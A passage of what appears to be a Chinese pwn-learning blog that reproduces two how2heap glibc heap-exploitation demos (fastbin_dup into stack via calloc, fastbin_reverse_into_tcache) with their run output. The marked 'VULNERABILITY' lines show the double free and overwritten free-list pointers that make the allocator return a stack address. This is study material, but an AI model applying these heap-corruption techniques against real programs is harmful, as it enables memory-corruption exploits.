class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking calloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Fill up tcache first.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want calloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st calloc(1,8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd calloc(1,8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd calloc(1,8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>); <span class="comment">//First call to free will add a reference to the fastbin</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Calling free(a) twice renders the program vulnerable to Double Free</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st calloc(1,8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd calloc(1,8): %p\n"</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that calloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd calloc(1,8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th calloc(1,8): %p\n"</span>, p);</span><br><span class="line">	assert(p == <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line">	<span class="comment">// assert((long)__builtin_return_address(0) == *(long *)p);</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>和2.27的一样不多说了运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">This file extends on fastbin_dup.c by tricking <span class="built_in">calloc</span> into</span><br><span class="line">returning a pointer to a controlled <span class="title function_">location</span> <span class="params">(in this <span class="keyword">case</span>, the <span class="built_in">stack</span>)</span>.</span><br><span class="line">Fill up tcache first.</span><br><span class="line">The address we want <span class="title function_">calloc</span><span class="params">()</span> to <span class="keyword">return</span> is 0x7fffffffdcb0.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>,<span class="number">8</span>)</span>: 0x55555555b380</span><br><span class="line">2nd <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>,<span class="number">8</span>)</span>: 0x55555555b3a0</span><br><span class="line">3rd <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>,<span class="number">8</span>)</span>: 0x55555555b3c0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we <span class="built_in">free</span> 0x55555555b380 again, things will crash because 0x55555555b380 is at the top of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">So, instead, we'll <span class="built_in">free</span> 0x55555555b3a0.</span><br><span class="line">Now, we can <span class="built_in">free</span> 0x55555555b380 again, since it's not the head of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">Now the <span class="built_in">free</span> <span class="built_in">list</span> has [ 0x55555555b380, 0x55555555b3a0, 0x55555555b380 ]. We'll now carry out our attack by modifying data at 0x55555555b380.</span><br><span class="line">1st <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>,<span class="number">8</span>)</span>: 0x55555555b380</span><br><span class="line">2nd <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>,<span class="number">8</span>)</span>: 0x55555555b3a0</span><br><span class="line">Now the <span class="built_in">free</span> <span class="built_in">list</span> has [ 0x55555555b380 ].</span><br><span class="line">Now, we have access to 0x55555555b380 <span class="keyword">while</span> it remains at the head of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">so now we are writing a fake <span class="built_in">free</span> <span class="title function_">size</span> <span class="params">(in this <span class="keyword">case</span>, <span class="number">0x20</span>)</span> to the <span class="built_in">stack</span>,</span><br><span class="line">so that <span class="built_in">calloc</span> will think there is a <span class="built_in">free</span> chunk there and agree to</span><br><span class="line"><span class="keyword">return</span> a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x55555555b380 to point right before the 0x20.</span><br><span class="line">3rd <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>,<span class="number">8</span>)</span>: 0x55555555b380, putting the <span class="built_in">stack</span> address on the <span class="built_in">free</span> <span class="built_in">list</span></span><br><span class="line">4th <span class="title function_">calloc</span><span class="params">(<span class="number">1</span>,<span class="number">8</span>)</span>: 0x7fffffffdcb0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="fastbin-reverse-into-tcache-1"><a href="#fastbin-reverse-into-tcache-1" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"This attack is intended to have a similar effect to the unsorted_bin_attack,\n"</span></span><br><span class="line">    <span class="string">"except it works with a small allocation size (allocsize &lt;= 0x78).\n"</span></span><br><span class="line">    <span class="string">"The goal is to set things up so that a call to malloc(allocsize) will write\n"</span></span><br><span class="line">    <span class="string">"a large unsigned value to the stack.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) {</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">    <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) {</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span></span><br><span class="line">    <span class="string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span></span><br><span class="line">    <span class="string">"already full, it will go in the fastbin.\n\n"</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span></span><br><span class="line">    <span class="string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span></span><br><span class="line">    <span class="string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span></span><br><span class="line">    <span class="string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span></span><br><span class="line">    <span class="string">"a single free is sufficient.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) {</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The stack address that we intend to target: %p\n"</span></span><br><span class="line">    <span class="string">"It's current value is %p\n"</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Now we use a vulnerability such as a buffer overflow or a use-after-free\n"</span></span><br><span class="line">    <span class="string">"to overwrite the next pointer at address %p\n\n"</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) {</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Let's just print the contents of our array on the stack now,\n"</span></span><br><span class="line">    <span class="string">"to show that it hasn't been modified yet.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span></span><br><span class="line">    <span class="string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span></span><br><span class="line">    <span class="string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span></span><br><span class="line">    <span class="string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span></span><br><span class="line">    <span class="string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span></span><br><span class="line">    <span class="string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span></span><br><span class="line">    <span class="string">"pointer is written to the stack.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span></span><br><span class="line">    <span class="string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span></span><br><span class="line">    <span class="string">"That's because the value on the stack is treated as a next pointer in the\n"</span></span><br><span class="line">    <span class="string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The contents of our array on the stack now look like this:\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>和2.27的一样这里不多说了运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">This attack is intended to have a similar effect to the unsorted_bin_attack,</span><br><span class="line">except it works with a small allocation <span class="title function_">size</span> <span class="params">(allocsize &lt;= <span class="number">0x78</span>)</span>.</span><br><span class="line">The goal is to <span class="built_in">set</span> things up so that a call to <span class="title function_">malloc</span><span class="params">(allocsize)</span> will write</span><br><span class="line">a large <span class="type">unsigned</span> value to the <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">First we need to <span class="title function_">free</span><span class="params">(allocsize)</span> at least 7 times to fill the tcache.</span><br><span class="line"><span class="params">(More than <span class="number">7</span> times works fine too.)</span></span><br><span class="line"></span><br><span class="line">The next pointer that we <span class="built_in">free</span> is the chunk that we're going to corrupt: 0x55555555b4d0</span><br><span class="line">It doesn't matter <span class="keyword">if</span> we corrupt it now or later. Because the tcache is</span><br><span class="line">already full, it will go in the fastbin.</span><br><span class="line"></span><br><span class="line">Next we need to <span class="built_in">free</span> between 1 and 6 more pointers. These will also go</span><br><span class="line">in the fastbin. If the <span class="built_in">stack</span> address that we want to overwrite is not zero</span><br><span class="line">then we need to <span class="built_in">free</span> exactly 6 more pointers, otherwise the attack will</span><br><span class="line">cause a segmentation fault. But <span class="keyword">if</span> the value on the <span class="built_in">stack</span> is zero then</span><br><span class="line">a single <span class="built_in">free</span> is sufficient.</span><br><span class="line"></span><br><span class="line">The <span class="built_in">stack</span> address that we intend to target: 0x7fffffffdc60</span><br><span class="line">It's current value is 0xcdcdcdcdcdcdcdcd</span><br><span class="line">Now we use a vulnerability such as a buffer overflow or a use-after-<span class="built_in">free</span></span><br><span class="line">to overwrite the next pointer at address 0x55555555b4d0</span><br><span class="line"></span><br><span class="line">The next step is to <span class="title function_">malloc</span><span class="params">(allocsize)</span> 7 times to empty the tcache.</span><br><span class="line"></span><br><span class="line">Let's just print the contents of our <span class="built_in">array</span> on the <span class="built_in">stack</span> now,</span><br><span class="line">to show that it hasn't been modified yet.</span><br><span class="line"></span><br><span class="line">0x7fffffffdc50: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc58: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc60: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc68: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc70: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc78: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">The next allocation triggers the <span class="built_in">stack</span> to be overwritten. The tcache</span><br><span class="line">is empty, but the fastbin isn't, so the next allocation comes from the</span><br><span class="line">fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.</span><br><span class="line">Those 7 chunks are copied in reverse order into the tcache, so the <span class="built_in">stack</span></span><br><span class="line">address that we are targeting ends up being the first chunk in the tcache.</span><br><span class="line">It contains a pointer to the next chunk in the <span class="built_in">list</span>, which is why a heap</span><br><span class="line">pointer is written to the <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">Earlier we said that the attack will also work <span class="keyword">if</span> we <span class="built_in">free</span> fewer than 6</span><br><span class="line">extra pointers to the fastbin, but only <span class="keyword">if</span> the value on the <span class="built_in">stack</span> is zero.</span><br><span class="line">That's because the value on the <span class="built_in">stack</span> is treated as a next pointer in the</span><br><span class="line">linked <span class="built_in">list</span> and it will trigger a crash <span class="keyword">if</span> it isn't a valid pointer or null.</span><br><span class="line"></span><br><span class="line">The contents of our <span class="built_in">array</span> on the <span class="built_in">stack</span> now look like this:</span><br><span class="line"></span><br><span class="line">0x7fffffffdc50: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc58: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc60: 0x55555555b4d0</span><br><span class="line">0x7fffffffdc68: 0x55555555b010</span><br><span class="line">0x7fffffffdc70: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc78: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">Finally, <span class="keyword">if</span> we <span class="built_in">malloc</span> one more time then we get the <span class="built_in">stack</span> address back: 0x7fffffffdc60</span><br></pre></td></tr></tbody></table></figure>









<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/tree/master/glibc_2.23">https://github.com/shellphish/how2heap/tree/master/glibc_2.23</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/112825556?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164941793516782094830354%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164941793516782094830354&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-112825556.article_score_rank_blog&amp;utm_term=large&amp;spm=1018.2226.3001.4450">https://blog.csdn.net/qq_41202237/article/details/112825556?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164941793516782094830354%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164941793516782094830354&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-112825556.article_score_rank_blog&amp;utm_term=large&amp;spm=1018.2226.3001.4450</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-259269.htm">https://bbs.pediy.com/thread-259269.htm</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/mut3p1g/how2heap">http://blog.leanote.com/post/mut3p1g/how2heap</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1759223">https://cloud.tencent.com/developer/article/1759223</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/</a></p>
</font>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
